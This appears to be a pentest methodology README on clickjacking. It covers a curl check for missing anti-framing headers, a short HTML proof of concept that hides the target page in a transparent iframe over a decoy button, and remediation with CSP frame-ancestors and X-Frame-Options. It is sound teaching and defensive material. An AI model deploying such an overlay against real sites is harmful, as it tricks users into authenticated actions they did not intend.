> **English** | [Italiano](README.md)

# Clickjacking (UI redress)

> - **Phase:** Web exploitation - OWASP A05:2021 Security Misconfiguration (missing anti-framing defenses)
> - **Visibility:** Low - the attack happens in the victim's browser on an attacker page
> - **Prerequisites:** a sensitive page that can be placed in an `iframe` (absence of `X-Frame-Options` and of `Content-Security-Policy: frame-ancestors`)
> - **Nature of the document:** methodology + practical PoC for a lab environment. No fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: trick the victim into clicking elements of a target page (e.g., a "confirm" button) by overlaying a decoy interface, while the clicks go to the real, invisible app.

---

## Executive summary

Clickjacking (UI redress) loads the target page in a transparent `iframe` over a decoy interface: the victim
believes they are interacting with the decoy (e.g., "click to win") but the clicks reach the target app, where
they are authenticated. If the action changes state (confirm payment, change settings, approve OAuth), the
attacker obtains it. It is exploitable only if the page does not forbid framing. Typical severity `Medium`,
higher if the "stolen" action is critical.

## Execution / commands

### Phase 1 - check anti-framing defenses

```bash
curl -s -I https://target.lab/account/settings | grep -iE 'x-frame-options|content-security-policy'
# if neither X-Frame-Options nor frame-ancestors appears -> the page is framable: clickjacking candidate
```

### Phase 2 - overlay PoC (attacker page)

```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:800px; opacity:0.0; z-index:2; }
  #lure { position:absolute; top:300px; left:420px; z-index:1; }
</style>
<div id="lure">click here to continue</div>
<iframe src="https://target.lab/account/settings"></iframe>  <!-- the victim's click goes to the real button -->
```

By aligning the decoy with the real button of the (invisible) iframe, the victim's click performs the action on
the target. Modern variant: abuse of drag-and-drop or double-click to confirm sensitive prompts.

## Analysis of results

If the page loads in the iframe (no anti-framing header), clickjacking is confirmed; the impact depends on the
target action (from `Medium` to `High` for approvals/payments). If the page sets `X-Frame-Options: DENY` or
`Content-Security-Policy: frame-ancestors 'none'`, the browser blocks framing and the vector is closed.

### Theoretical analysis

Clickjacking separates what the user **sees** from what they **interact with**: it is an attack on the trust
model of the interface, not the server. The defense is server-side (instructing the browser not to be framed):
`frame-ancestors` in CSP and/or `X-Frame-Options`, plus `SameSite` on cookies to reduce the cross-site action.

## Remediation (blue team)

**Detection.** Absence of anti-framing headers on sensitive pages; external referers on sensitive actions.

**Hardening.** `Content-Security-Policy: frame-ancestors 'self'` (or `'none'`); `X-Frame-Options:
DENY`/`SAMEORIGIN` as fallback; explicit non-"stealable" confirmations; `SameSite` on cookies.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (clickbandit) | proxy/scanner | web - active | generates a clickjacking poc for the target page |
| `curl` | http client | cli - active | quick check of the anti-framing headers |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | drive-by compromise | `T1189` | the victim visits a page that frames the target and hijacks their clicks. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [csrf](<../csrf (Cross-Site Request Forgery)/README.en.md>) | clickjacking | an "interaction-based" alternative when csrf is token-protected |
| clickjacking | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (frame-ancestors, xfo) links to secure coding |

---

> **Note:** Educational content. The PoCs must be used only on owned applications or with explicit authorization, in a lab. Illustrative outputs.
